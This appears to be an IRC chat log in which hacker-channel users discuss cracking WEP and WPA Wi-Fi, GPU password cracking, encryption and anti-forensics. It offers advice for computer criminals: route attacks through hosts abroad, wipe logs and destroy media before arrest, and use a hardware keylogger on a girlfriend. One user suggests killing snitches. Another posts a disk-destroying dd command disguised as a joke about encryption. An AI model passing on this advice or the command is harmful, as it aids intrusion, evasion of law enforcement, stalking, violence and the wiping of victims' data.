[10:41.40] <schnozzle> how do you crack weps?
[10:41.48] <tytaN> aircrack-ng
[10:41.49] <fxm> aircrack-ng
[10:41.54] <Bot> Very carefully
[10:42.03] <tytaN> just spoof your mac address
[10:42.16] <darkness> so how do u crack hash passwds that use salts. cause nearly every os uses them?
[10:42.27] <Bot> Im getting a WPA wifi, no questions about that
[10:42.37] <fxm> i'd recommend WPA2-PSK Personal
[10:42.43] <_Legi0n> it's not that wpa can't be cracked too...
[10:42.57] <Bot> WPA > WEP
[10:43.00] <tytaN> yeah.. but to my experience it's easier to crack a wpa2 password than a wpa fxm
[10:43.07] <fxm> and disabling the ability to manage the device via wireless
[10:43.22] <tytaN> because with wpa u have to be there for the whole time while cowpatty or aircrack is running
[10:43.27] <tytaN> wpa2 u can prepare at home
[10:43.28] <Anubis> wpa2-psk are the closest networks around (as mine too)
[10:43.47] <Bot> Opened up Google Chrome. By the time it opened up I forgot why I opened it
[10:43.51] <fxm> you could use Enterprise, and setup a radius server too
[10:43.57] <tytaN> and just let the password hashes run through after u prpared them
[10:44.03] <tytaN> in like 10 minutes 100million passwords
[10:44.24] <tytaN> 100million passwords would take u 2-3 days with wpa
[10:44.41] <darkness> where do u downlad a good passwd hash?
[10:44.48] <tytaN> meaning u have to stay in range of the wifi for 2days+
[10:44.56] <tytaN> with wpa2 just 10 minutes
[10:45.10] <Anubis> so wpa2 sucks? :o
[10:45.18] <tytaN> u have to create them manually for every network
[10:45.22] <tytaN> because it's created with the ESSID
[10:45.25] <tytaN> or are you not talking about wifi aps?
[10:45.30] <Anubis> essid?
[10:45.36] <tytaN> (that is done with the program genpmk which is included in the cowpatty package)
[10:45.38] <tytaN> darkness
[10:45.46] <tytaN> with genpmk u can create hashkeys
[10:45.59] <tytaN> no wpa2 is good but my personal opinion is wpa is more secure than wpa2
[10:46.06] <tytaN> essid is the network name
[10:46.08] <darkness> cool
[10:46.26] <tytaN> google for cowpatty
[10:46.46] <tytaN> very nice wpa cracking tool
[10:46.48] <cassan0va> www.youtube.com/watch?v=zfwJHLRAYgM
[10:46.55] <tytaN> prefer it in comparison to aircrack-ng
[10:47.14] <Anubis> damn i really got to improve my english skills
[10:47.37] <Anubis> i need half the time to think about what you meant >_>
[10:47.49] <cassan0va> Anubis
[10:47.55] <cassan0va> where are u come from ?
[10:47.57] <Anubis> germany :D
[10:48.04] <tytaN> my english isn't that good either
[10:48.05] <tytaN> ;(
[10:48.07] <cassan0va> nice country
[10:48.14] <tytaN> fragen: pm
[10:48.16] <tytaN> :P
[10:48.16] <cassan0va> that country have good cc
[10:48.16] <cassan0va> :p
[10:48.23] <Anubis> tyta, german? ;D
[10:48.24] <Anubis> cc?
[10:48.30] <cassan0va> credit card :d
[10:48.36] <Anubis> lol
[10:48.38] <darkness> heh, i setup ssh on my server. then i let my mate use it. but i was trying out snooping on his tty sessions. was lol
[10:49.14] <_Legi0n> while kinda nice to know, it's usually not the best idea to let the whole channel know where you're from...
[10:49.29] <tytaN> jo deutscher, aber ihr solltet in solchen channels nich drueber reden wer ihr seid und wo ihr wohnt ;P
[10:49.39] <_Legi0n> ^
[10:49.40] <_Legi0n> <:
[10:49.48] <cassan0va> yea _Legi0n
[10:49.50] <Anubis> i guess its not that important to know the country i guess
[10:49.51] <tytaN> also ich sag nur dass ich deutscher bin aber nich wo ich wohne zb
[10:50.00] <tytaN> (nich in de)
[10:50.10] <_Legi0n> still tells a lot... <:
[10:50.15] <_Legi0n> imo.
[10:50.19] <Anubis> okay i shut up next time
[10:50.19] <tytaN> just what i told him
[10:50.25] <tytaN> i just told him that i speak german
[10:50.27] <tytaN> and that it's part of my nationality
[10:50.31] <tytaN> but u shouldn't let anyone know where u actually live
[10:50.43] <Bot> I think im gonna head to bed. Gnight!
[10:50.50] <Anubis> nice night bot
[10:51.03] <tytaN> yeah i know

[10:53.23] <Anubis> ah who cares
[10:53.27] <Anubis> where you from? Earth

[10:53.48] <Rode0s_> Uranus
[10:55.02] <AndroMike> hi
[10:55.16] <darkness> Thing is using the same nick is real bad. for example if you do then your identity is prolly comprimised already with chatting in other channels using same ip
[10:55.45] <Anubis> well got this nick just for this chat :)
[10:56.14] <darkness> and i'm just a tech guy who doesn't hack
[10:56.31] <anonoops> doesn't hack *yet*
[10:56.40] <AndroMike> ;)
[10:57.03] <_Legi0n> darkness, you went to dc right?
[10:57.46] <darkness> dc?
[10:57.50] <_Legi0n> defcon
[10:57.58] <selket> hrm
[10:58.03] <selket> oh shit
[10:58.05] <tytaN> defcon
[10:58.07] <tytaN> :E
[10:58.14] <fxm> heard a bunch of people with smartphones got rooted
[10:58.15] <darkness> erm, i have no recollection of that
[10:58.16] <selket> i forgot we were meant to meet up with qwintuplets there
[10:58.17] <selket> hahahaha
[10:58.19] <darkness> :-)
[10:58.28] <_Legi0n> sorry, misunderstood you then.
[10:58.36] <darkness> maybe not
[10:58.41] <darkness> i'm anonymous
[10:58.58] <darkness> if i went to defcon. i wouldn't meet up with people
[10:59.13] <_Legi0n> i was gonna say something along the lines.. "if you went to dc and you're no hacker you're prolly a fed"
[10:59.14] <_Legi0n> but you ruined it.
[10:59.22] <darkness> lol
[10:59.23] <_Legi0n> :/
[10:59.29] <darkness> no, not a fed
[10:59.43] <darkness> wouldn't mind being one if i got paid fed's cash to talk bollocks
[10:59.49] <selket> well thats stupid
[11:02.04] <_Legi0n> nah, i wouldn't enjoy working with those guys
[11:02.10] <_Legi0n> at least not in my country
[11:03.07] <selket> no i mean the not meeting other anon people
[11:03.25] <RaT> darkness, i thought we met up at dc for sex :-P
[11:03.41] <fxm> bromance
[11:04.20] <_Legi0n> selket, and i was actually talking to darkness. :D but yeah, that would suck.
[11:04.31] <darkness> well conspiracy theory. could topiary have been caught due to tflow knowing or giving info out?
[11:04.43] <selket> bla bla bla
[11:04.52] <darkness> RaT: don't tell everyone ;-)
[11:04.57] <RaT> nobody knows how topiary was figured out?
[11:05.06] <fxm> did anyone listen to the blogtalkradio broadcast, about how they were released with a trojan installed on their pcs after getting caught?
[11:05.51] <RaT> bios backdoor? :-P
[11:06.14] <fxm> i would guess keylogger/sniffer
[11:06.47] <RaT> well, i know NCIS and FBI both have a bios backdoor - but i'm not sure how it works
[11:07.05] <RaT> meaning i don't know if it offers some sort of hardware remote access, or more of just infects the OS
[11:07.22] <RaT> i know there was a good talk on infecting the OS from bios backdoor at blackhat a few years back
[11:07.40] <fxm> i was told a few years back about a way to infect the EEPROM on a NIC to execute shellcode on boot
[11:08.03] <RaT> the worst thing about hardware backdoors is that they can be undetectable
[11:08.17] <darkness> My gf was being difficult to penetrate so i had to backdoor her
[11:09.09] <RaT> http://www.eecs.berkeley.edu/~csturton/papers/defeating-uci-oak11.pdf
[11:09.13] <Rode0s_> Was it More difficult than backdooring a gibson?
[11:09.14] <RaT> there's a good paper from berkeley on it
[11:09.34] <RaT> essentially with UCI people believed you could detect backdoors (some people believed it at least)
[11:09.36] <RaT> they showed that wasn't true
[11:10.00] <RaT> point I'm making is that if your stuff has been touched by the feds you should be scrapping it or using it for unimportant th ings
[11:10.31] <tytaN> well but we've been tought to trash our pc's/laptop's after getting in touch with the police
[11:10.35] <tytaN> or being controlled at customs
[11:10.37] <fxm> your gf was being promiscuous, so i gratuitously arped her :D
[11:10.38] <tytaN> with our equpiment
[11:10.58] <RaT> good practice :-D
[11:11.01] <tytaN> i think they'd be wise enough to do the same..
[11:11.19] <RaT> usually in computer crime cases it comes down to snitches
[11:11.24] <darkness> You've trashed a laptop?
[11:11.29] <_Legi0n> tytaN, depends on who you are and what you do.
[11:11.35] <RaT> anytime there are multiple defendents, somebody always snitches
[11:11.54] <RaT> i mean face it - most of these people are computer criminals and not hardened gangsters :-P
[11:12.01] <_Legi0n> i wouldn't expect the fbi to give a shit if i hacked some porn sites for free xxs tbh. :D
[11:12.03] <tytaN> i didn't
[11:12.08] <tytaN> i haven't been in touch with the police for almost a year and they never got close to any of my hardware ;(
[11:12.18] <RaT> everybody just needs to practice the magic words "i want to speak to my lawyer"
[11:12.26] <tytaN> yeah
[11:12.31] <vircuser> what irc programe do you use ?
[11:12.34] <RaT> if you don't say shit, often a lawyer can get you out of everything
[11:12.48] <RaT> vircuser: i use bitchx
[11:12.50] <Anubis> depends on the lawyer ;D
[11:12.55] <RaT> Anubis: very true
[11:12.55] <fxm> don't talk about anything to anyone except for your lawyer
[11:13.03] <RaT> Anubis: but you don't gain anything by talking to the po-lice
[11:13.11] <tytaN> this is a proposal for real cyber criminals not for #antisec idlers of course
[11:13.18] <vircuser> thanks :)
[11:13.49] <tytaN> < irssi
[11:13.54] <Anubis> well in fact i do like police, cause they helped me very often ... they are not there to disturb you at least... but well, they just do theyre job... which nt means, that i got to help em against myself :D
[11:14.16] <RaT> i have a friend in fed prison right now because of a snitch :(
[11:14.25] <RaT> he had a great job and everything, now he's sitting in a fucking cell
[11:14.28] <hypotenuse> RaT, snitch the snitch.
[11:14.35] <RaT> at least they might make a movie about it :-P
[11:14.37] <hypotenuse> I don't take betrayal lightly. Find the person, and make them pay.
[11:14.51] <_Legi0n> ^
[11:14.52] <_Legi0n> true.
[11:14.53] <RaT> hypotenuse: kill the snitch before they can snitch, if you have a way
[11:15.05] <Rode0s_> Stiches 4 snitches
[11:15.06] <RaT> once they write a statement against you, you're fucked
[11:15.10] <tytaN> :S
[11:15.11] <RaT> that's the tricky part
[11:15.13] <Anubis> how to figure out whos a snitch... wont be that easy i guess
[11:15.19] <RaT> also if you kill them after they write a statement, it looks really bad on you
[11:15.23] <hypotenuse> You can always have a lawyer contest the legitimacy of that statement
[11:15.29] <RaT> you can do what we did with durandal
[11:15.34] <RaT> social them over the phone as the fbi
[11:15.36] <RaT> :-P
[11:15.43] <hypotenuse> your easiest manouver is to attack the credibility of the source.
[11:15.46] <RaT> if you can get them to fall for it and they snitch, then kick them out
[11:15.57] <hypotenuse> I've never let a situation slip out of my grasp on the law.
[11:16.18] <RaT> hypotenuse: sometimes you can do that.  Often the judge is looking at everybody as criminals though, so they don't care too much about credibility
[11:16.40] <_Legi0n> and most of them don't understand this shit anyway
[11:16.40] <hypotenuse> RaT, the law works for whoever you want it to.
[11:16.41] <RaT> hypotenuse: also, the snitch often gives enough information that the police are able to secure physical evidence
[11:16.59] <hypotenuse> True, I got my hardware threatened by seizure a few days ago
[11:17.14] <darkness> why?
[11:17.14] <RaT> I'm not saying it's impossible to get out of stuff.  I'm just saying that my friends and myself (that got into trouble) were unable to completely get out of it
[11:17.20] <hypotenuse> Fought back and cited lack of probable cause, now protected by double jeopardy.
[11:17.31] <hypotenuse> darkness, someone must've said something and struck the match that is the pigs.
[11:17.41] <RaT> interesting.  whyw ould they threaten rather than just take?
[11:18.01] <hypotenuse> RaT, they didn't threaten, they actually said they could seize it, but no warrant in hand
[11:18.10] <RaT> ah, i see
[11:18.15] <RaT> so intimidation
[11:18.16] <hypotenuse> So I pulled the lawyer card, and they waited without any action, proving they had no jurisdiction
[11:18.23] <RaT> better dban yo shit
[11:18.36] <hypotenuse> No problem, moving house in 2 weeks lol
[11:18.42] <fxm> if they think evidence is being destroyed however, then they have probable cause, for which they don't even need the warrant
[11:18.57] <hypotenuse> fxm, they had full view of my data center and SAN room
[11:19.15] <hypotenuse> but when I pulled the lawyer card, no action. Shot them in the gut
[11:19.29] <RaT> why were they looking into you?
[11:19.31] <hypotenuse> further more, I provided evidence to federal court proving my line was under an illegal wiretap
[11:19.33] <RaT> dangerous associations :-P
[11:19.37] <derp5955> they can't do anything without warrants so *shrugs*
[11:19.51] <hypotenuse> I have a PBX set up in the house, and they had routed all active calls to a second number on the line
[11:20.11] <hypotenuse> so when I found out, I contested the activity
[11:20.19] <hypotenuse> turns out, even the wiretap wasn't authorized
[11:20.27] <hypotenuse> some break neck redneck wannabe trying to make a case out've nothing.
[11:20.31] <RaT> my suggestion to anybody committing computer crime is to own boxes in china/russia/pick an unfriendly country
[11:20.40] <fxm> hypotenuse, was it a pen register or a full splice?
[11:20.41] <RaT> do all of your hacking from there, store all of your shit encrypted there
[11:20.42] <hypotenuse> heh, the treaty protection, nice.
[11:20.52] <SwordFish> greetings all
[11:20.57] <hypotenuse> fxm, they had even tapped the local trunk
[11:20.57] <RaT> if possible, make a few hops so teh feds have to do their work
[11:21.18] <hypotenuse> whatever they were after, they didn't get a cent.
[11:21.19] <RaT> if you work in a group, you could have somebody else wipe the logs on the first hop in the case of arrest
[11:21.24] <RaT> that's good
[11:21.44] <hypotenuse> RaT, I prefer to do shady things on RAM-HDD's that run off PCI-e
[11:21.52] <hypotenuse> although it's an expensive solution and not for everyone.
[11:21.55] <JackofCoins> Does anyone know of any really great python networking libraries
[11:22.07] <RaT> hypotenuse: make sure you completely kill your power
[11:22.13] <RaT> remove battery too
[11:22.23] <hypotenuse> JackofCoins, try twistedmatrix
[11:22.28] <JackofCoins> hypotenuse: there are hard drives that run as RAM does?
[11:22.31] <hypotenuse> I've got degaussers too.
[11:22.33] <RaT> i saw a forensics talk at a law enforcement convention where they were grabbing the pc and freezing the ram
[11:22.40] <RaT> and then getting the data off of it
[11:22.40] <fxm> JackofCoins, FusionIO
[11:22.46] <hypotenuse> JackofCoins, it's a PCI card with RAM slots to run as memory
[11:22.50] <Rode0s_> Epoxy
[11:22.50] <RaT> same convention they showed pulling truecrypt key out of pagefile.sys
[11:23.00] <RaT> fucking nasty shit the feds have been learning
[11:23.01] <hypotenuse> Epoxy is a little on the foil hat end.
[11:23.06] <JackofCoins> As in it wipes all data after shutdown right?
[11:23.23] <hypotenuse> RaT, don't use truecrypt. Go with an RSA solution or crypto_luks
[11:23.31] <Rode0s_> Dm crypt
[11:23.37] <hypotenuse> JackofCoins, no power = data gone
[11:23.37] <RaT> hypotenuse: i don't use truecrypt, just saying
[11:23.43] <Rode0s_> Epoxy your room asap
[11:23.44] <darkness> Like to see them crack an ironkey :-)
[11:23.56] <hypotenuse> and unless you're like the next mitnick, they won't be coming in with nitrogen to freeze the chips in an attempt to recover data
[11:24.09] <Rode0s_> XD
[11:24.17] <JackofCoins> thnx hypotenuse
[11:24.17] <RaT> darkness: i'm curious about ironkey also.  We used them in the military (for secure data) until they banned flash drives
[11:24.33] <hypotenuse> no worries
[11:24.39] <Rode0s_> Now you use sdopbox?
[11:24.51] <hypotenuse> HA, dropbox.
[11:24.52] <RaT> hypotenuse: I agree completely.  Any details on what they did come with when the lulzsec arrests were made?
[11:24.56] <hypotenuse> Worst cloud solution ever.
[11:24.58] <darkness> Mitnick wasn't really that good iirc
[11:25.15] <Rode0s_> XD
[11:25.18] <RaT> Mitnick had a good 0day connection.  He wasn't too much of a coder himself though.
[11:25.30] <Rode0s_> Social engineer
[11:25.30] <darkness> Anyone play with cuda and gpu math procesing power for passwd cracks?
[11:25.32] <hypotenuse> RaT, fuzzy at most. I'm guessing they confirmed his identity, carted him off and had a WET team survey the premises and confiscate any/all media
[11:25.35] <Rode0s_> A good one
[11:25.41] <RaT> was getting 0day from Israel if I recall.  Was talking to him at an Idefense party years and years ago
[11:25.45] <hypotenuse> darkness, I just bought a 4U Tesla C2090 box (;
[11:26.01] <hypotenuse> ran me a solid $10.5k, but the throughput is stellar.
[11:26.05] <RaT> I think he has a book coming out though, at least that's what he said on facebook
[11:26.13] <Rode0s_> hypotenuse: whatbis that?
[11:26.17] <darkness> cool
[11:26.17] <RaT> so apparently he is finally able to tell his story
[11:26.20] <darkness> how much?
[11:26.39] <RaT> what are you using the Tesla for?
[11:26.46] <hypotenuse> 2.66 Gflops
[11:26.53] <FoxInSocks252> metasploit any
[11:26.55] <hypotenuse> RaT, work stuff mostly. I do a variety of things.
[11:27.12] <RaT> I heard ATI was outperforming nvidia on cracking.  Not so much my thing though, I've got friends taht do that for me :-)
[11:27.20] <selket> ohai hypotenuse
[11:27.22] <hypotenuse> Specialist in Linear Cryptography, Object Orientated security & Aerodynamic Physics, Cryptanalysis,
[11:27.26] <hypotenuse> ohai selket
[11:27.28] <RaT> one of our guys was on team hashcat this year at defcon
[11:27.30] <RaT> they almost won
[11:27.49] <RaT> Object Oriented Security?  How does that work?
[11:28.14] <hypotenuse> Privilege based on ACL and/or selective auth access
[11:28.27] <RaT> what security model?
[11:28.36] <darkness> Anyone heard of the handle mryowler?
[11:28.50] <hypotenuse> RaT, I work with military aircraft sometimes. Not exactly your house safe (;
[11:29.07] <hypotenuse> It's no fun, but it keeps you thinking.
[11:29.16] <RaT> ah, so you work with DoD?
[11:29.34] <hypotenuse> RaT, nope. No direct GOV association.
[11:29.40] <hypotenuse> I was born in the EU anyway
[11:29.41] <darkness> be great to have cloud gpu clusters
[11:29.44] <RaT> well, i meant as a contractor or something
[11:30.10] <hypotenuse> RaT, subcontractor, I don't associate on a direct basis except for briefings and engineer commanding
[11:30.27] <RaT> gotcha
[11:30.51] <hypotenuse> tbh, my boss laughed when he got wind of my arrest
[11:31.08] <RaT> I'd like to do more work with cryptanalysis, but anything i want to do ends up taking too much time
[11:31.20] <SwordFish> rat - any recomended encryption anti forensci programs out there?
[11:31.25] <hypotenuse> RaT, what's your fundamental understanding of cryptography?
[11:31.41] <hypotenuse> SwordFish, with a question like that, you'd need the background information.
[11:31.41] <RaT> I'm a PhD student at one of the top US universities :-D
[11:31.43] <RaT> so pretty good actually
[11:31.50] <hypotenuse> So mathematically fluent?
[11:31.53] <RaT> yes
[11:31.55] <m4tr1c3s> are we still going strong?
[11:32.00] <RaT> but not good enough to start attacking algorithms
[11:32.02] <hypotenuse> Indeed m4tr1c3s
[11:32.04] <RaT> i mean, i can follow the papers against md5 and such
[11:32.13] <m4tr1c3s> lol I fell asleep
[11:32.17] <RaT> but i don't think i would have come up with that stuff on my own
[11:32.17] <RaT> know what i'm saying?
[11:32.23] <m4tr1c3s> this is amazing
[11:32.35] <hypotenuse> RaT, attacking algorithms is a flawed term. If you can find a mathematical flaw in a scheme, then it is flawed
[11:32.44] <RaT> so you attack implementations?
[11:32.48] <RaT> that part i can do
[11:32.57] <hypotenuse> Basically the math of where it begins
[11:33.02] <hypotenuse> From conception, what sources compose the key
[11:33.03] <RaT> but when i think of cryptanalysis, i think of the schneier definition
[11:33.20] <hypotenuse> Rat, Cryptanalysis can be defined as breaking Enigma too.
[11:33.29] <RaT> I agree
[11:33.39] <RaT> I'm just saying that when I think of it, I think of attacking the algorithms and not the implementation
[11:33.41] <hypotenuse> The structure of todays cryptographic protocols are defined highly by complex math
[11:33.58] <hypotenuse> RaT, then you know your own strengths well enough by now
[11:34.22] <RaT> well, i don't know if i would say complex math - but at least a series of discreet operations that become somewhat complex in the end
[11:34.32] <RaT> but if you flowchart them (or whatever you prefer), they are quite simple
[11:34.35] <darkness> So how good is filevault on osx?
[11:34.37] <hypotenuse> Heh, public private keys etc
[11:34.41] <RaT> yea
[11:34.48] <RaT> well, i guess simple if you have a good math background
[11:34.52] <hypotenuse> darkness, no clue about filevault
[11:34.59] <JackofCoins> Could you give an example of a simple encryption algorithm? Like how 'password' becomes XU(282181uds92?
[11:35.01] <RaT> darkness: i'm not sure either
[11:35.08] <RichyB_> who can i talk to about #academe?
[11:35.15] <hypotenuse> (CRYPT_3DES * SALT)
[11:35.33] <RaT> i think the simplest thing to start with would be XOR right?
[11:35.38] <RaT> at least that's what academia often does
[11:35.42] <darkness> Arn't hash keys easy to crack because they've used the same algo for years?
[11:35.44] <RaT> or one time pads
[11:35.46] <hypotenuse> sorry, Jumped the gun a bit :p
[11:35.47] <RaT> i think one time pads are really easy
[11:35.50] <RaT> :-D
[11:35.56] <hypotenuse> OTP is a little less widely known
[11:36.07] <RaT> oh that's a shame
[11:36.13] <RaT> it's the only *secure* encryption, har har
[11:36.33] <RaT> i might still have a java thing i wrote for it, give me a minute!
[11:36.33] <hypotenuse> See if you crypt with a pathetic source of randomization, the flaw becomes the efficacy of arriving at the same conclusion, using a different source
[11:36.45] <RaT> indeed
[11:37.00] <hypotenuse> TRNG's are as weak as their randomization source
[11:37.14] <hypotenuse> then again, the average linux computer can be quite handy considering /dev/urandom
[11:37.25] <fxm> there are hardware RNGs
[11:37.32] <tytaN> i heard urandom is not that random at all
[11:37.34] <RaT> yea, i've seen attacks to burn through entropy also
[11:37.36] <hypotenuse> sampling realtime system IO to create random numbers
[11:37.40] <RaT> :-P
[11:37.46] <m4tr1c3s> cat /dev/urandom :D
[11:37.48] <hypotenuse> tytaN, you could use /dev/random but that relies on input
[11:37.51] <hypotenuse> HAHA
[11:37.55] <hypotenuse> nice one m4tr1c3s
[11:38.06] <hypotenuse> or try this
[11:38.14] <m4tr1c3s> it looks awesome :p
[11:38.26] <hypotenuse> dd if=/dev/urandom of=/dev/hda1
[11:38.33] <hypotenuse> It crypts your disk so fast
[11:38.42] <hypotenuse> then asks you for a password
[11:38.53] <m4tr1c3s> cool
[11:38.58] <FoxInSocks090> PLease give me  the forum  with hacking tutorilas
[11:39.14] <hypotenuse> we have tutorilas? are those retarded tortillas?
[11:39.18] <tytaN> i used a random number generator this TylerDurden guy uploaded for us in one of the first lessons.. but I don't know if that was so smart considering that he also recommended to use truecrypt -.-
[11:39.27] <JackofCoins> I think he means tortillas
[11:39.33] <tytaN> but the one he uploaded was a lot faster than urandom
[11:39.56] <hypotenuse> tytaN, urandom is system reliant
[11:39.58] <m4tr1c3s> it's ok, some people mispel tortillas sometimes
[11:40.07] <m4tr1c3s> nothing to be ashamed of
[11:40.14] <RC2> sup
[11:40.19] <tytaN> yeah so i heard <:
[11:40.30] <tytaN> so it can't be that bad right
[11:40.34] <FoxInSocks090> tutorials
[11:40.37] <FoxInSocks090> :S
[11:40.38] <hypotenuse> "It allows access to environmental noise collected from device drivers and other sources" -- source: wikipedia.org
[11:40.45] <RaT> got a link in a second
[11:40.47] <RaT> was just removing a few things
[11:40.48] <fxm> tostito's
[11:40.50] <RaT> this is from 2005
[11:40.55] <RaT> but should be useful for showing one time pad
[11:40.58] <hypotenuse> Unless you're a transformer, I think that's enough to be secure with your PGP.
[11:41.16] <RaT> http://selinux.gave.me.this.remoteshell.org/school/onetimepad.html
[11:41.17] <tytaN> :D
[11:41.20] <RaT> very basic, but in javascript
[11:41.22] <hypotenuse> FoxInSocks090, we don't have forums that teach you how to watch your girlfriend.
[11:41.24] <RaT> also shows fake messages
[11:41.32] <RaT> so you can make a fake key
[11:41.32] <hypotenuse> However, there are forums that teach you how to get one.
[11:41.37] <RaT> then if you were to get caught, you turn over the fake key
[11:41.46] <RaT> it decrypts the message to something slightly embarassing, but not illegal
[11:41.49] <darkness> So if you're just interested in computer security. How do i get a passwd to listen in at the academy?
[11:42.01] <fxm> read topic
[11:42.17] <RaT> FoxInSocks090 - just use hardware keylogger :-P
[11:42.17] <hypotenuse> That's... interesting
[11:42.32] <hypotenuse> RaT, I don't cache keys
[11:42.43] <hypotenuse> I just generate them for operations based on a need to use basis
[11:42.51] <RaT> hyptotenuse, with enough random data you could technically use XOR
[11:42.54] <Rode0s_> Any good hw keylogger?
[11:42.58] <hypotenuse> other than that, my SAN's are hardware encrypted.
[11:43.05] <RaT> you could also generate fake keys to decrypt XOR to slightly incriminating data
[11:43.08] <hypotenuse> plus there's RAID 5 to mix it up.
[11:43.11] <RaT> was going to code it years ago, but never got around to it
[11:43.31] <RaT> rode0s: thinkgeek used to have one but i think they stopped selling it
[11:43.34] <hypotenuse> RaT, the real labrynith would be SSD's
[11:43.41] <FoxInSocks090> thanks
[11:43.46] <RaT> hypotenuse: just burn them out :-P
[11:43.54] <Rode0s_> I need europe $:
[11:43.57] <hypotenuse> the efficacy of disk forensics on those is gonna be a BITCH of a peper to write
[11:43.58] <RaT> there's no verifiable way to secure delete on them is there/
[11:44.16] <RaT> at least last tiem i looked into it there wasn't
[11:44.17] <hypotenuse> RaT, you can't really recover a bit on flash once it's flipped
[11:44.28] <hypotenuse> and even so, you'd have to physically know the position and location and previous value
[11:44.57] <RaT> sure, but in order to keep the chips from burning out, doesn't it write to them optimally
[11:44.59] <RaT> let me find the paper, brb
[11:45.22] <hypotenuse> My opinion is that putting it through a gutmann operation is like burning the same piece of paper 35 times
[11:45.29] <RaT> http://www.usenix.org/events/fast11/tech/full_papers/Wei.pdf
[11:45.44] <RaT> maybe you haven't seen the research then :-P
[11:45.51] <RaT> not that there's anything wrong with that, it's hard to keep up
[11:45.52] <hypotenuse> maybe, let me read this then (:
[11:46.02] <RaT> but it's the fault of the algorithm that tries to keep the chips from burning out
[11:46.06] <hypotenuse> Hell yeah. There are tons of researchers everywhere
[11:46.12] <RaT> so where you think is being written isn't actually being written
[11:46.21] <RaT> but anyways, look at that papre
[11:46.54] <hypotenuse> Maybe the flaw is really the hardware on the access chip.
[11:47.09] <hypotenuse> It's telling the disk that there's only one way to skin a mongoose
[11:47.20] <hypotenuse> when you think your OS is relaying the actual operation to the bits
[11:47.45] <RaT>  We found that
[11:47.45] <RaT> none of the available software techniques for sanitizing
[11:47.48] <RaT> individual ?les were effective.
[11:47.52] <RaT> that's what scares me
[11:48.10] <RaT> yea, they say the drives essentially need built in sanitize commands that work properly
[11:48.11] <hypotenuse> Well we have a DoD grade sanitizer at work
[11:48.16] <RaT> due to hardware obfuscation
[11:48.26] <RaT> for hard drives or ssd?
[11:48.40] <hypotenuse> we degauss the whole disk, which even removes the actual tracks put in by the manufacturer (spinning HD's)
[11:48.45] <hypotenuse> For SSD's well, burn em.
[11:48.52] <hypotenuse> We've got an incinerator too
[11:49.12] <hypotenuse> effectively, the degausser makes the disk useless
[11:49.12] <RaT> har har, i miss my incinerator
[11:49.12] <m4tr1c3s> store everything on small usbs
[11:49.20] <RaT> i'm with m4tr1c3s
[11:49.21] <m4tr1c3s> crush them in an electric vice
[11:49.28] <RaT> store important stuff on easily destroyed media
[11:49.41] <RaT> 32GB SD :-D
[11:49.41] <m4tr1c3s> micros sd is better :)
[11:49.41] <RaT> eat that bitch
[11:49.53] <RaT> seriously, if you're going to go to jail - just pull it out and eat it
[11:49.54] <hypotenuse> The graph exhibits a
[11:49.55] <hypotenuse> spiking pattern which is probably due to the page-level
[11:49.56] <m4tr1c3s> flashrom when snapped = unrecoverable
[11:49.57] <hypotenuse> management by the FTL.
[11:50.00] <RaT> you can eat it before the po po break down the door
[11:50.05] <m4tr1c3s> practially
[11:50.06] <hypotenuse> That's the problem right there.
[11:50.13] <RaT> what's the problem?
[11:50.34] <hypotenuse> The FTL which handles the blocks basically doesn't do as it's told on a per second basis
[11:50.48] <hypotenuse> it seems a more appropriate solution would be to have a second hardware device to govern the disk
[11:50.57] <hypotenuse> instead of leaving it to its independance
[11:51.37] <RaT> i agree
[11:51.42] <RaT> like i said, it's abstracted away :(
[11:51.56] <hypotenuse> It would be like RAID, only on a memory management manner
[11:52.05] <hypotenuse> say that 5 times faster
[11:52.05] <hypotenuse> say that 5 times faster
[11:52.13] <RaT> i'm getting a 4GB ironkey tomorrow
[11:52.24] <RaT> i hope it's nice...not sure how much i can trust it
[11:52.35] <RaT> think m4tr1c3s has the right idea :-P
[11:52.37] <hypotenuse> RaT, I heard they rely on a storage server for your keys
[11:52.47] <RaT> i think that's just enterprise right?
[11:52.53] <hypotenuse> I hope so
[11:52.56] <RaT> i'm talking S200 basic
[11:52.59] <hypotenuse> there's also a backup service
[11:53.01] <hypotenuse> avoid either
[11:53.03] <RaT> if i see anything over the net i'm shipping that shit back
[11:53.09] <RaT> yea, i avoided the personal because of that
[11:53.13] <RaT> personal comes witha  bunch of software
[11:53.18] <RaT> basic is just physically hardened and shit
[11:53.21] <RaT> actually costs a bit more too
[11:53.21] <hypotenuse> third party access makes you wonder how secure the device actually is
[11:53.38] <RaT> i fear all 3rd party access
[11:53.41] <RC2> whats the lesson on ?
[11:53.43] <RaT> everybody works with the feds
[11:53.44] <hypotenuse> yeah, but the HSM module on board is supposed to purge the private key in the event it is compromised
[11:53.59] <RaT> RC2: random security to do with wiping data and encryption
[11:54.05] <hypotenuse> heh
[11:54.08] <hypotenuse> calm down nao
[11:54.11] <RC2> RaT cool thanks
[11:54.19] <RaT> blackberry wipes itself
[11:54.30] <RaT> i have a few friends that work for RIM.  They claim that shit is secure but I doubt it
[11:54.52] <RaT> i wasn't able to recover data from a wiped blackberry though.  So i guess in case of arrest get your password wrong 10 times :-P
[11:55.07] <RaT> even wipes the OS
[11:55.07] <hypotenuse> When you're pushing for a device to hit the enterprise market
[11:55.27] <hypotenuse> you would obviously tout up the shiny new windows and lights
[11:55.29] <Rode0s_> What about iPhone wipe after 10 wrong attenpts?
[11:55.39] <RaT> I don't know anything about Iphone
[11:55.46] <hypotenuse> Rode0_s, iPhones are a whole other mess.
[11:55.52] <RaT> be careful with iphone and blackberry backups though
[11:55.57] <hypotenuse> There was a file found in the iPads and phones that tracked locations
[11:55.57] <RaT> i knwo you can extract the passwords from those
[11:56.08] <hypotenuse> literally, your phone keeping tabs on you
[11:56.16] <RaT> i think if you plug an iphone into itunes it backs up automatically?
[11:56.17] <Ivain-Tintin> someone can help me learning sqli? plz :)
[11:56.20] <RaT> i'm not for sure though, don't have one
[11:56.29] <hypotenuse> it's bad enough the iOS platform has exploits, but now someone can forensically steal your previous travelling history? Bad money.
[11:56.31] <RaT> Ivain-Tintin: just use sqlmap :-PpppPPPpPPP
[11:56.40] <RaT> or maybe somebody will school you, i'm getting too tired though
[11:56.48] <hypotenuse> Same. I need some beer.
[11:57.05] <hypotenuse> It's been some good conversation though (:
[11:57.11] <hypotenuse> More food for thought I guess
[11:57.14] <RaT> yea, i'm impressed with this room
[11:57.27] <RaT> went to DC19 and thought people like fox had balls
[11:57.29] <JackofCoins> Thnx for your talks guys
[11:57.35] <RaT> so we gave them some rum and agreed to give some support
[11:57.40] <RaT> figured i'd check out this room today :-)
[11:57.42] <Ivain-Tintin> Rat link?
